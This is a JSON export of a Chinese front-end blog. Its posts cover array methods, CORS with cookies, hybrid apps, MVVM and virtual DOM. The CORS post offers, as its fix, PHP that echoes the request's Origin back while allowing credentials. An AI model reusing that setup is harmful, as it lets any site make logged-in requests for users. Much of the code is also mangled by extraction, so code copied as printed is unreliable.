{"meta":{"title":"前端迷 (front-end fan)","subtitle":"欢迎投稿、合作，交流QQ：188105274(微信，邮箱同Q)","description":"前端开发爱好者frank的工作笔记","author":"frank","url":"https://ru23.com"},"pages":[{"title":"目录","date":"2018-08-27T11:47:23.000Z","updated":"2018-10-24T06:48:48.313Z","comments":false,"path":"categories/index.html","permalink":"https://ru23.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-27T11:26:57.000Z","updated":"2018-10-24T06:48:52.696Z","comments":false,"path":"tags/index.html","permalink":"https://ru23.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"关于数组中forEach() 、map()、filter()、reduce()、some()、every()的总结","slug":"2018-10-关于数组中forEach-、map-、filter-、reduce-、some-、every-的总结","date":"2018-10-22T14:43:01.000Z","updated":"2018-10-24T09:39:37.773Z","comments":true,"path":"note/afd16d4c.html","link":"","permalink":"https://ru23.com/note/afd16d4c.html","excerpt":"","text":"1、forEach()12345var arr = [1, 2, 3, 4];arr.forEach((item, index, arr) = &gt; &#123; console.log(item) //结果为1,2,3,4 &#125;)//forEach遍历数组，无返回值，不改变原数组，仅仅只是遍历、常用于注册组件、指令等等。 2、map()123456var arr = [1, 2, 3, 4];arr.map((item, index, arr) = &gt; &#123; return item * 10 //新数组为10,20,30,40 &#125;)////map遍历数组，返回一个新数组，不改变原数组的值。 3、filter()123456var arr = [1, 2, 3, 4];arr.filter((item, index, arr) = &gt; &#123; return item &gt; 2 //新数组为[3,4] &#125;)//filter过滤掉数组中不满足条件的值，返回一个新数组，不改变原数组的值。 4、reduce()1234567891011121314var arr = [1, 2, 3, 4];arr.reduce((result, item, index, arr) = &gt; &#123; console.log(result) // 1 3 6 result为上次一计算的结果 console.log(item) // // 2 3 4 console.log(index) // // 1 2 3 return result + item //最终结果为10 &#125;)//reduce 让数组的前后两项进行某种计算。//然后返回其值，并继续计算。//不改变原数组，返回计算的最终结果，从数组的第二项开始遍历。 5、some()1234567var arr = [1, 2, 3, 4];arr.some((item, index, arr) = &gt; &#123; return item &gt; 3 //结果为true &#125;)//遍历数组每一项，有一项返回true,则停止遍历，//结果返回true。不改变原数组 6、every()1234567var arr = [1, 2, 3, 4];arr.every((item, index, arr) = &gt; &#123; return item &gt; 1 //结果为false &#125;)//遍历数组每一项，每一项返回true,则最终结果为true。//当任何一项返回false时，停止遍历，返回false。不改变原数组","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"跨域问题携带cookie加入withCredentials报错原因以及解决方案","slug":"2018-10-跨域问题携带cookie加入withCredentials报错原因以及解决方案","date":"2018-10-22T10:26:41.000Z","updated":"2018-10-25T05:13:25.276Z","comments":true,"path":"note/b2790fdc.html","link":"","permalink":"https://ru23.com/note/b2790fdc.html","excerpt":"","text":"1.跨域允许解决方法：服务器发送允许客户端发送源的报文头header(‘Access-Control-Allow-Origin:’.$_SERVER[“HTTP_ORIGIN”]);2.客户端无法携带跨域cookie这个时候就可以在extjs中加入withCredentials1234567891011121314$.ajax(&#123; url: 'http://120.111.111.123/setcookie.php', method: 'POST', params: &#123; 'text': 'hello world' &#125;, withCredentials: true, success: function(transport)&#123; // do something &#125;, failure: function(transport)&#123; alert(\"Error: \" - transport.responseText); &#125;&#125;); 3.因为加了withCredentials报文头，可是客户端不知道服务器允不允许报的错（耿直的客户端）这个时候就在服务器发送Access-Control-Allow-Credentialsheader(‘Access-Control-Allow-Credentials:true’);4.由于客户端不知道服务端是否允许POST请求而报的错这个时候要在服务器端加入123header(&apos;Access-Control-Allow-Methods:OPTIONS, GET, POST&apos;);header(&apos;Access-Control-Allow-Headers:x-requested-with&apos;);header(&apos;Access-Control-Max-Age:86400&apos;); 以上汇总起来就是 12345678header(&apos;Access-Control-Allow-Methods:OPTIONS, GET, POST&apos;);header(&apos;Access-Control-Allow-Headers:x-requested-with&apos;);header(&apos;Access-Control-Max-Age:86400&apos;); header(&apos;Access-Control-Allow-Origin:&apos;.$_SERVER[&apos;HTTP_ORIGIN&apos;]);header(&apos;Access-Control-Allow-Credentials:true&apos;);header(&apos;Access-Control-Allow-Methods:GET, POST, PUT, DELETE, OPTIONS&apos;);header(&apos;Access-Control-Allow-Headers:x-requested-with,content-type&apos;);header(&apos;Access-Control-Allow-Headers:Origin, No-Cache, X-Requested-With, If-Modified-Since, 1.跨域允许不允许报错的跨域12Response to preflight request doesn&apos;t pass access control check: No &apos;Access-Control-Allow-Origin&apos; header is present on the requested resource. Origin &apos;null&apos; is therefore not allowed access. 报这个错就说明我们跨域了，不在允许的访问源，于是乎我在服务的setcookie.php加入header(&#39;Access-Control-Allow-Origin:*&#39;);允许所有源然后又报错1234XMLHttpRequest cannot load http://120.111.111.123/setcookie.php. Request header field X-Requested-With is not allowed by Access-Control-Allow-Headers in preflight response.``` 在跨域的时候，js不会直接发post请求，而是先发送一个option请求，看看服务器允许什么访问头（比如是不是允许post请求），验证成功后才会发送真正的请求 #用谷歌的开发者工具抓的option报文OPTIONS /setcookie.php HTTP/1.1Host: 120.111.111.123Connection: keep-alivePragma: no-cacheCache-Control: no-cacheAccess-Control-Request-Method: POSTOrigin: nullUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36Access-Control-Request-Headers: x-requested-withAccept: /Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.812 #path /setcookie.phpsession_start();header(‘Access-Control-Allow-Origin:*’);header(‘Access-Control-Allow-Methods:OPTIONS, GET, POST’); // 允许option，get，post请求header(‘Access-Control-Allow-Headers:x-requested-with’); // 允许x-requested-with请求头header(‘Access-Control-Max-Age:86400’); // 允许访问的有效期// 功能…// …123456789101112131415161718192021继续测试我们的新功能，成功的解决了跨域问题但是，cookie没有“设置成功”。而之所以没有“设置成功”，是因为cookie存在本地，但是每个cookie都有一个domain，当你本地的cookie中存在你当前访问的域时，才会被带过去，而我的index.html文件是本地访问的，即http://localhost/index.html，而cookie的域是要跨域的域名的，所以不行了。```js$.ajax(&#123; type: &quot;POST&quot;, url: &quot;跨域的url&quot;, xhrFields: &#123; withCredentials: true &#125;, // 发送凭据 contentType: &quot;application/json; charset=utf-8&quot;, data: JSON.stringify(data), dataType: &quot;json&quot;, success: function (message) &#123; &#125;, error: function (message) &#123; console.log(message) &#125;&#125;); 继续访问，报错123Response to preflight request doesn&apos;t pass access control check: A wildcard &apos;*&apos; cannot be used in the &apos;Access-Control-Allow-Origin&apos; header when the credentials flag is true. Origin &apos;null&apos; is therefore not allowed access. The credentials mode of an XMLHttpRequest is controlled by the withCredentials attribute. 现在这个错误产生的原因就是1.因为加入了withCredentials之后，Access-Control-Allow-Origin就不能用“*”了，既然不允许访问这个源，那我就让你发个报文头让你允许访问呗！ 12345678910111213#path setcookie.phpsession_start();// 是否存在请求源if(isset($_SERVER[&quot;HTTP_ORIGIN&quot;])) &#123; header(&apos;Access-Control-Allow-Origin:&apos;.$_SERVER[&quot;HTTP_ORIGIN&quot;]); &#125;header(&apos;Access-Control-Allow-Methods:OPTIONS, GET, POST&apos;);header(&apos;Access-Control-Allow-Headers:x-requested-with&apos;);header(&apos;Access-Control-Max-Age:86400&apos;);// 功能...// ... 好了，上传完代码，继续测试。发送请求之后，又报错了12Response to preflight request doesn&apos;t pass access control check: Credentials flag is &apos;true&apos;, but the &apos;Access-Control-Allow-Credentials&apos; header is &apos;&apos;. It must be &apos;true&apos; to allow credentials. Origin &apos;null&apos; is therefore not allowed access. 大概的意思就是说我给你发了withCredentials报文头，但是你服务器没有跟我说允许我带这个报文头，那么解决方法就是加上允许发这个报文头的报文头 123456789101112131415session_start();// 是否存在请求源if(isset($_SERVER[&quot;HTTP_ORIGIN&quot;])) &#123; header(&apos;Access-Control-Allow-Origin:&apos;.$_SERVER[&quot;HTTP_ORIGIN&quot;]); &#125;header(&apos;Access-Control-Allow-Origin:null&apos;); header(&apos;Access-Control-Allow-Methods:OPTIONS, GET, POST&apos;);header(&apos;Access-Control-Allow-Headers:x-requested-with&apos;);header(&apos;Access-Control-Max-Age:86400&apos;);header(&apos;Access-Control-Allow-Credentials:true&apos;);// 功能...// ... 终于成功了！ 摘自链接：https://www.jianshu.com/p/552daaf2869c來源：简书","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"cookie，跨域，ajax","slug":"cookie，跨域，ajax","permalink":"https://ru23.com/tags/cookie，跨域，ajax/"}]},{"title":"输入框input类型为number时，去掉上下箭头样式","slug":"2018-10-输入框input类型为number时，去掉上下箭头方式","date":"2018-10-22T08:57:28.000Z","updated":"2018-10-24T03:46:03.355Z","comments":true,"path":"note/1c69a5f4.html","link":"","permalink":"https://ru23.com/note/1c69a5f4.html","excerpt":"","text":"1234567891011&lt;input type=\"number\" ...&gt;&lt;style&gt; input::-webkit-outer-spin-button, input::-webkit-inner-spin-button &#123; -webkit-appearance: none; &#125; input[type=\"number\"]&#123; -moz-appearance: textfield; &#125;&lt;/style&gt;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"html5","slug":"html5","permalink":"https://ru23.com/tags/html5/"}]},{"title":"前端面试之hybrid","slug":"2018-10-fe-interview-hybrid","date":"2018-10-20T17:13:10.000Z","updated":"2018-10-24T03:46:03.336Z","comments":true,"path":"note/b3429210.html","link":"","permalink":"https://ru23.com/note/b3429210.html","excerpt":"","text":"image.png 一、hybrid 是什么，为何会用 hybrid1.1 hybrid 文字解释 hybrid 即“混合”，即前端和客户端的混合开发 需前端开发人员和客户端开发人员配合完成 某些环节也可能涉及到 server 端 PS：不要以为自己的前端就可以不理会客户端的知识 image.png 1.2 hybrid 存在价值 可以快速迭代更新【关键】（无需 app 审核，思考为何？） 体验流畅（和 NA 的体验基本类似） 减少开发和沟通成本，双端公用一套代码 1.3 webview 是 app 中的一个组件（ app 可以有 webview ，也可以没有） 于加载 h5 页面，即一个小型的浏览器内核 image.png image.png 1.4 file 协议 其实在一开始接触 html开发，就已经使用了 file 协议 只不过你当时没有“协议”“标准”等这些概念 image.png 1.5 http(s) 协议 image.png 1.6 两者区别 file 协议：本地文件，快 http(s) 协议：网络加载，慢 1.7 具体实现 不是所有场景都适合使用 hybrid 使用 NA ：体验要求极致，变化不频繁（无头条的首页） 使用 hybrid ：体验要求高，变化频繁（如头条的新闻详情页） 使用 h5 ：体验无要求，不常用（如举报、反馈等页面） 实现 前端做好静态页面（html js css），将文件交给客户端 客户端拿到前端静态页面，以文件形式存储在 app 中 客户端在一个 webview 中 使用 file 协议加载静态页面 image.png 二、hybrid 更新上线流程2.1 具体流程图 image.png 思考（目的，可行途径） image.png 要替换每个客户端的静态文件 只能客户端来做（客户端是我们开发的） 客户端去 server 下载最新的静态文件 我们维护 server 的静态文件 2.2 完整流程 image.png 分版本，有版本号，如 201803211015 将静态文件压缩成 zip包，上传到服务端 客户端每次启动，都去服务端检查版本号 如果服务端版本号大于客户端版本号，就去下载最新的 zip 包 下载完之后解压包，然后将现有文件覆盖 要点总结 要点1：服务端的版本和zip包维护 要点2：更新zip 包之前，先对比版本号 要点3：zip 下载解压和覆盖 三、hybrid 和 h5 的区别3.1 优点 体验更好，跟 NA体验基本一致 可快速迭代，无需 app 审核【关键】 3.2 缺点 开发成本高。联调、测试、查 bug 都比较麻烦 运维成本高。参考此前讲过的更新上线的流程 3.3 适用的场景 hybrid ： 产品的稳定功能，体验要求高，迭代频繁 h5 ： 单词的运营活动（如 xx 红包）或不常用功能 四、前端和客户端通讯4.1 JS 和客户端通讯的基本形式 JS 访问客户端能力，传递参数和回调函数 客户端通过回调函数返回内容 image.png 4.2 schema 协议简介和使用 之前介绍了 http(s) 和 file 协议 schema 协议 —— 前端和客户端通讯的约定 image.png image.png image.png 4.3 schema 使用的封装 image.png image.png image.png 4.4 内置上线 将以上封装的代码打包，叫做 invoke.js，内置到客户端 客户端每次启动 webview，都默认执行 invoke.js 本地加载，免去网络加载的时间，更快 本地加载，没有网络请求，黑客看不到 schema 协议，更安全","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://ru23.com/tags/面试/"},{"name":"Hybird","slug":"Hybird","permalink":"https://ru23.com/tags/Hybird/"}]},{"title":"前端面试之组件化","slug":"2018-10-fe-interview-component","date":"2018-10-20T16:20:32.000Z","updated":"2018-10-24T03:46:03.334Z","comments":true,"path":"note/4cf9f504.html","link":"","permalink":"https://ru23.com/note/4cf9f504.html","excerpt":"","text":"image.png 一、说一下对组件化的理解1.1 组件的封装 视图 数据 变化逻辑 image.png 1.2 组件的复用 props 传递 复用 image.png image.png 二、JSX 本质是什么2.1 JSX 语法 html 形式 引入 JS 变量和表达式 循环 style 和 className 事件 JSX 语法根本无法被浏览器所解析 那么它如何在浏览器运行？ image.png 2.2 JSX 解析 JSX 其实是语法糖 开发环境会将 JSX 编译成 JS 代码 JSX 的写法大大降低了学习成本和编码工作量 同时，JSX 也会增加 debug成本 image.png image.png image.png 2.3 JSX 独立的标准 JSX 是 React 引入的，但不是 React 独有的 React已经将它作为一个独立标准开放，其他项目也可用 React.createElement 是可以自定义修改的 说明：本身功能已经完备；和其他标准监控和扩展性没问题 三、JSX 和 vdom 的关系3.1 为何需要 vdom vdom 是 React初次推广开来的，结合 JSX JSX 就是模板，最终要渲染成 html 初次渲染 + 修改 state 后的 re-render 正好符合 vdom 的应用场景 3.2 React.createElement 和 h image.png 3.3 何时 patch 初次渲染 - ReactDOM.render(&lt;App/&gt;, container) 会触发 patch(container, vnode) re-render - setState 会触发 patch(vnode, newVnode) 3.4 自定义组件的解析 image.png ‘div’ - 直接渲染 &lt;div&gt; 即可，vdom 可以做到 Input 和 List ，是自定义组件（class），vdom 默认不认识 因此 Input 和 List 定义的时候必须声明 render 函数 根据 props 初始化实例，然后执行实例的 render 函数 render 函数返回的还是 vnode对象 image.png 四、说一下 React setState 的过程4.1 setState 的异步 image.png setState 为何需要异步？ 可能会一次执行多次 setState 你无法规定、限制用户如何使用 setState 没必要每次 setState 都重新渲染，考虑性能 即便是每次重新渲染，用户也看不到中间的效果 只看到最后的结果即可 image.png 4.2 vue 修改属性也是异步 效果、原因和 setState 一样 4.3 setState 的过程 每个组件实例，都有renderComponent 方法 执行 renderComponent 会重新执行实例的 render render 函数返回 newVnode ，然后拿到 preVnode 执行 patch(preVnode, newVnode) 五、React vs vue5.1 两者的本质区别 vue - 本质是 MVVM 框架，由 MVC 发展而来 React - 本质是前端组件化框架，由后端组件化发展而来 但这并不妨碍他们两者都能实现相同的功能 5.2 看模板和组件化的区别 vue- 使用模板（最初由 angular 提出） React- 使用 JSX 模板语法上，我更加倾向于 JSX 模板分离上，我更加倾向于 vue 模板的区别 模板应该和 JS 逻辑分离 image.png image.png image.png 组件化区别 React 本身就是组件化，没有组件化就不是 React vue 也支持组件化，不过是在 MVVM 上的扩展 对于组件化，我更加倾向于 React ，做的彻底而清晰 5.3 两者共同点 都支持组件化 都是数据驱动试图","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://ru23.com/tags/面试/"},{"name":"组件化","slug":"组件化","permalink":"https://ru23.com/tags/组件化/"}]},{"title":"前端面试之MVVM浅析","slug":"2018-10-fe-interview-mvvm","date":"2018-10-20T16:10:02.000Z","updated":"2018-10-24T03:46:03.338Z","comments":true,"path":"note/872b0859.html","link":"","permalink":"https://ru23.com/note/872b0859.html","excerpt":"","text":"image.png 一、说一下使用 jquery 和使用框架的区别1.1 jQuery 实现 todo-list image.png 1.2 vue 实现 todo-list image.png 1.3 jQuery 和框架的区别 数据和视图的分离，解耦（开放封闭原则） 以数据驱动视图，只关心数据变化，DOM 操作被封装 二、说一下对 MVVM 的理解2.1 MVC M - Model 数据 V - View 视图、界面 C - Controller 控制器、逻辑处理 image.png image.png 2.2 MVVM Model - 模型、数据 View - 视图、模板（视图和模型是分离的） ViewModel - 连接 Model 和 View image.png 2.3 关于 ViewModel MVVM 不算是一种创新 但其中的 ViewModel 确实一种创新 真正结合前端场景应用的创建 image.png image.png 2.4 MVVM 框架的三大要素 响应式：vue如何监听到 data 的每个属性变化？ 模板引擎：vue 的模板如何被解析，指令如何处理？ 渲染：vue 的模板如何被渲染成 html ？以及渲染过程 三、vue 中如何实现响应式3.1 什么是响应式 修改 data 属性之后，vue 立刻监听到 data 属性被代理到 vm 上 image.png 3.2 Object.defineProperty image.png 3.3 模拟实现 image.png image.png 四、vue 中如何解析模板4.1 模板是什么 本质：字符串 有逻辑，如 v-if v-for 等 与 html 格式很像，但有很大区别 最终还要转换为 html 来显示 模板最终必须转换成 JS 代码，因为 有逻辑（v-if v-for），必须用 JS才能实现 转换为 html 渲染页面，必须用 JS 才能实现 因此，模板最重要转换成一个 JS 函数（render 函数） image.png 4.2 render 函数 模板中所有信息都包含在了 render 函数中 this 即vm price 即 this.price 即 vm.price，即 data 中的 price _c 即 this._c 即 vm._c image.png image.png image.png 4.3 render 函数与 vdom vm._c 其实就相当于 snabbdom中的 h 函数 render 函数执行之后，返回的是 vnode image.png image.png updateComponent中实现了 vdom 的 patch 页面首次渲染执行 updateComponent data 中每次修改属性，执行updateComponent 五、vue 的整个实现流程 第一步：解析模板成 render 函数 第二步：响应式开始监听 第三步：首次渲染，显示页面，且绑定依赖 第四步：data 属性变化，触发 rerender image.png 5.1 第一步：解析模板成 render 函数 image.png image.png image.png image.png 模板中的所有信息都被 render函数包含 模板中用到的 data 中的属性，都变成了 JS 变量 模板中的v-model v-for v-on 都变成了 JS 逻辑 render 函数返回 vnode 5.2 第二步：响应式开始监听 Object.defineProperty 将 data 的属性代理到 vm上 image.png 5.3 第三步：首次渲染，显示页面，且绑定依赖 初次渲染，执行 updateComponent，执行 vm._render() 执行 render 函数，会访问到 vm.list vm.title 会被响应式的 get 方法监听到 执行 updateComponent ，会走到 vdom 的 patch 方法 patch 将 vnode渲染成 DOM ，初次渲染完成 image.png image.png 为何要监听 get ，直接监听 set 不行吗？ data 中有很多属性，有些被用到，有些可能不被用到 被用到的会走到 get ，不被用到的不会走到 get 未走到 get 中的属性，set的时候我们也无需关心 避免不必要的重复渲染 image.png 5.4 第四步：data 属性变化 image.png image.png 修改属性，被响应式的 set 监听到 set中执行 updateComponent updateComponent 重新执行 vm._render() 生成的 vnode 和 prevVnode ，通过 patch进行对比 渲染到 html 中 image.png","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://ru23.com/tags/面试/"},{"name":"MVVM","slug":"MVVM","permalink":"https://ru23.com/tags/MVVM/"}]},{"title":"虚拟DOM（二）","slug":"2018-10-vdom-improve","date":"2018-10-20T15:10:14.000Z","updated":"2018-10-24T03:46:03.345Z","comments":true,"path":"note/a6c4da3d.html","link":"","permalink":"https://ru23.com/note/a6c4da3d.html","excerpt":"","text":"一、为什么需要虚拟DOM 先介绍浏览器加载一个HTML文件需要做哪些事，帮助我们理解为什么我们需要虚拟DOM。webkit引擎的处理流程 所有浏览器的引擎工作流程都差不多，如上图大致分5步：创建DOM tree –&gt; 创建Style Rules -&gt; 构建Render tree -&gt; 布局Layout –&gt; 绘制Painting 第一步，用HTML分析器，分析HTML元素，构建一颗DOM树。 第二步：用CSS分析器，分析CSS文件和元素上的inline样式，生成页面的样式表。 第三步：将上面的DOM树和样式表，关联起来，构建一颗Render树。这一过程又称为Attachment。每个DOM节点都有attach方法，接受样式信息，返回一个render对象（又名renderer）。这些render对象最终会被构建成一颗Render树。 第四步：有了Render树后，浏览器开始布局，会为每个Render树上的节点确定一个在显示屏上出现的精确坐标值。 第五步：Render数有了，节点显示的位置坐标也有了，最后就是调用每个节点的paint方法，让它们显示出来。 当你用传统的源生api或jQuery去操作DOM时，浏览器会从构建DOM树开始从头到尾执行一遍流程。比如当你在一次操作时，需要更新10个DOM节点，理想状态是一次性构建完DOM树，再执行后续操作。但浏览器没这么智能，收到第一个更新DOM请求后，并不知道后续还有9次更新操作，因此会马上执行流程，最终执行10次流程。显然例如计算DOM节点的坐标值等都是白白浪费性能，可能这次计算完，紧接着的下一个DOM更新请求，这个节点的坐标值就变了，前面的一次计算是无用功。 即使计算机硬件一直在更新迭代，操作DOM的代价仍旧是昂贵的，频繁操作还是会出现页面卡顿，影响用户的体验。真实的DOM节点，哪怕一个最简单的div也包含着很多属性，可以打印出来直观感受一下 虚拟DOM就是为了解决这个浏览器性能问题而被设计出来的。例如前面的例子，假如一次操作中有10次更新DOM的动作，虚拟DOM不会立即操作DOM，而是将这10次更新的diff内容保存到本地的一个js对象中，最终将这个js对象一次性attach到DOM树上，通知浏览器去执行绘制工作，这样可以避免大量的无谓的计算量 二、实现虚拟DOM123456789&lt;div id=\"real-container\"&gt; &lt;p&gt;Real DOM&lt;/p&gt; &lt;div&gt;cannot update&lt;/div&gt; &lt;ul&gt; &lt;li className=\"item\"&gt;Item 1&lt;/li&gt; &lt;li className=\"item\"&gt;Item 2&lt;/li&gt; &lt;li className=\"item\"&gt;Item 3&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 用js对象来模拟DOM节点如下 123456789101112const tree = Element('div', &#123; id: 'virtual-container' &#125;, [ Element('p', &#123;&#125;, ['Virtual DOM']), Element('div', &#123;&#125;, ['before update']), Element('ul', &#123;&#125;, [ Element('li', &#123; class: 'item' &#125;, ['Item 1']), Element('li', &#123; class: 'item' &#125;, ['Item 2']), Element('li', &#123; class: 'item' &#125;, ['Item 3']), ]),]);const root = tree.render();document.getElementById('virtualDom').appendChild(root); 用js对象模拟DOM节点的好处是，页面的更新可以先全部反映在js对象上，操作内存中的js对象的速度显然要快多了。等更新完后，再将最终的js对象映射成真实的DOM，交由浏览器去绘制 12345678910111213141516171819function Element(tagName, props, children) &#123; if (!(this instanceof Element)) &#123; return new Element(tagName, props, children); &#125; this.tagName = tagName; this.props = props || &#123;&#125;; this.children = children || []; this.key = props ? props.key : undefined; let count = 0; this.children.forEach((child) =&gt; &#123; if (child instanceof Element) &#123; count += child.count; &#125; count++; &#125;); this.count = count;&#125; 第一个参数是节点名（如div），第二个参数是节点的属性（如class），第三个参数是子节点（如ul的li）。除了这三个参数会被保存在对象上外，还保存了key和count 有了js对象后，最终还需要将其映射成真实的DOM 123456789101112131415Element.prototype.render = function() &#123; const el = document.createElement(this.tagName); const props = this.props; for (const propName in props) &#123; setAttr(el, propName, props[propName]); &#125; this.children.forEach((child) =&gt; &#123; const childEl = (child instanceof Element) ? child.render() : document.createTextNode(child); el.appendChild(childEl); &#125;); return el;&#125;; 根据DOM名调用源生的createElement创建真实DOM，将DOM的属性全都加到这个DOM元素上，如果有子元素继续递归调用创建子元素，并appendChild挂到该DOM元素上。这样就完成了从创建虚拟DOM到将其映射成真实DOM的全部工作 三、Diff算法 我们已经完成了创建虚拟DOM并将其映射成真实DOM的工作，这样所有的更新都可以先反映到虚拟DOM上，如何反映呢？需要明确一下Diff算法 两棵树如果完全比较时间复杂度是O(n^3) React的Diff算法的时间复杂度是O(n)。要实现这么低的时间复杂度，意味着只能平层地比较两棵树的节点，放弃了深度遍历 这样做，似乎牺牲了一定的精确性来换取速度，但考虑到现实中前端页面通常也不会跨层级移动DOM元素，所以这样做是最优的。 我们新创建一棵树，用于和之前的树进行比较 123456789const newTree = Element('div', &#123; id: 'virtual-container' &#125;, [ Element('h3', &#123;&#125;, ['Virtual DOM']), // REPLACE Element('div', &#123;&#125;, ['after update']), // TEXT Element('ul', &#123; class: 'marginLeft10' &#125;, [ // PROPS Element('li', &#123; class: 'item' &#125;, ['Item 1']), // Element('li', &#123; class: 'item' &#125;, ['Item 2']), // REORDER remove Element('li', &#123; class: 'item' &#125;, ['Item 3']), ]),]); 只考虑平层地Diff的话，就简单多了，只需要考虑以下4种情况 第一种是最简单的，节点类型变了，例如下图中的P变成了h3。我们将这个过程称之为REPLACE。直接将旧节点卸载（componentWillUnmount）并装载新节点（componentWillMount）就行了 旧节点包括下面的子节点都将被卸载，如果新节点和旧节点仅仅是类型不同，但下面的所有子节点都一样时，这样做显得效率不高。但为了避免O(n^3)的时间复杂度，这样做是值得的。这也提醒了React开发者，应该避免无谓的节点类型的变化，例如运行时将div变成p就没什么太大意义 第二种也比较简单，节点类型一样，仅仅属性或属性值变了 123renderA: &lt;ul&gt;renderB: &lt;ul class: &apos;marginLeft10&apos;&gt;=&gt; [addAttribute class &quot;marginLeft10&quot;] 我们将这个过程称之为PROPS。此时不会触发节点的卸载（componentWillUnmount）和装载（componentWillMount）动作。而是执行节点更新（shouldComponentUpdate到componentDidUpdate的一系列方法） 1234567891011121314151617181920212223242526function diffProps(oldNode, newNode) &#123; const oldProps = oldNode.props; const newProps = newNode.props; let key; const propsPatches = &#123;&#125;; let isSame = true; // find out different props for (key in oldProps) &#123; if (newProps[key] !== oldProps[key]) &#123; isSame = false; propsPatches[key] = newProps[key]; &#125; &#125; // find out new props for (key in newProps) &#123; if (!oldProps.hasOwnProperty(key)) &#123; isSame = false; propsPatches[key] = newProps[key]; &#125; &#125; return isSame ? null : propsPatches;&#125; 第三种是文本变了，文本对也是一个Text Node，也比较简单，直接修改文字内容就行了，我们将这个过程称之为TEXT 第四种是移动，增加，删除子节点，我们将这个过程称之为REORDER 在中间插入一个节点，程序员写代码很简单：$(B).after(F)。但如何高效地插入呢？简单粗暴的做法是：卸载C，装载F，卸载D，装载C，卸载E，装载D，装载E。如下图 我们写JSX代码时，如果没有给数组或枚举类型定义一个key，就会看到下面这样的warning。React提醒我们，没有key的话，涉及到移动，增加，删除子节点的操作时，就会用上面那种简单粗暴的做法来更新。虽然程序运行不会有错，但效率太低，因此React会给我们一个warning 如果我们在JSX里为数组或枚举型元素增加上key后，React就能根据key，直接找到具体的位置进行操作，效率比较高。如下图 常见的最小编辑距离问题，可以用Levenshtein Distance算法来实现，时间复杂度是O(M*N)，但通常我们只要一些简单的移动就能满足需要，降低点精确性，将时间复杂度降低到O(max(M, N)即可 最终Diff出来的结果如下 12345678&#123; 1: [ &#123;type: REPLACE, node: Element&#125; ], 4: [ &#123;type: TEXT, content: \"after update\"&#125; ], 5: [ &#123;type: PROPS, props: &#123;class: \"marginLeft10\"&#125;&#125;, &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ], 6: [ &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ], 8: [ &#123;type: REORDER, moves: [&#123;index: 2, type: 0&#125;]&#125; ], 9: [ &#123;type: TEXT, content: \"Item 3\"&#125; ],&#125; 四、映射成真实DOM 虚拟DOM有了，Diff也有了，现在就可以将Diff应用到真实DOM上了 深度遍历DOM将Diff的内容更新进去 12345678910111213function dfsWalk(node, walker, patches) &#123; const currentPatches = patches[walker.index]; const len = node.childNodes ? node.childNodes.length : 0; for (let i = 0; i &lt; len; i++) &#123; walker.index++; dfsWalk(node.childNodes[i], walker, patches); &#125; if (currentPatches) &#123; applyPatches(node, currentPatches); &#125;&#125; 具体更新的代码如下，其实就是根据Diff信息调用源生API操作DOM 1234567891011121314151617181920212223242526272829function applyPatches(node, currentPatches) &#123; currentPatches.forEach((currentPatch) =&gt; &#123; switch (currentPatch.type) &#123; case REPLACE: &#123; const newNode = (typeof currentPatch.node === 'string') ? document.createTextNode(currentPatch.node) : currentPatch.node.render(); node.parentNode.replaceChild(newNode, node); break; &#125; case REORDER: reorderChildren(node, currentPatch.moves); break; case PROPS: setProps(node, currentPatch.props); break; case TEXT: if (node.textContent) &#123; node.textContent = currentPatch.content; &#125; else &#123; // ie node.nodeValue = currentPatch.content; &#125; break; default: throw new Error(`Unknown patch type $&#123;currentPatch.type&#125;`); &#125; &#125;);&#125; 虚拟DOM的目的是将所有操作累加起来，统计计算出所有的变化后，统一更新一次DOM","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"虚拟DOM","slug":"虚拟DOM","permalink":"https://ru23.com/tags/虚拟DOM/"}]},{"title":"虚拟DOM（一）","slug":"2018-10-vdom-base","date":"2018-10-20T14:12:12.000Z","updated":"2018-10-24T03:46:03.343Z","comments":true,"path":"note/96d236e5.html","link":"","permalink":"https://ru23.com/note/96d236e5.html","excerpt":"","text":"一、什么是 vdom 用 JS 模拟 DOM 结构 DOM 变化的对比，放在 JS 层来做 提高重绘性能 二、设计一个需求场景 image.png 用jQuery实现 image.png image.png image.png 遇到的问题 DOM 操作是“昂贵”的，js 运行效率高 尽量减少 DOM 操作，而不是“推倒重来” 项目越复杂，影响就越严重 vdom 即可解决这个问题 image.png 三、vdom 的如何应用，核心 API 是什么什么是 vdom image.png 介绍 snabbdom image.png 介绍 snabbdom - h 函数 image.png 介绍 snabbdom - patch 函数 image.png 重做jQuery的demo 使用 data生成 vnode 第一次渲染，将 vnode 渲染到 #container中 并将 vnode 缓存下来 修改 data 之后，用新 data 生成 newVnode 将 vnode 和 newVnode 对比 image.png 核心 API h(‘&lt;标签名&gt;’, {…属性…}, […子元素…]) h(‘&lt;标签名&gt;’, {…属性…}, ‘….’) patch(container, vnode) patch(vnode, newVnode) 四、介绍一下 diff 算法4.1 vdom 为何使用 diff 算法 DOM 操作是“昂贵”的，因此尽量减少 DOM 操作 找出本次 DOM 必须更新的节点来更新，其他的不更新 这个“找出”的过程，就需要 diff 算法 image.png patch(container, vnode) image.png image.png 演示过程 image.png image.png 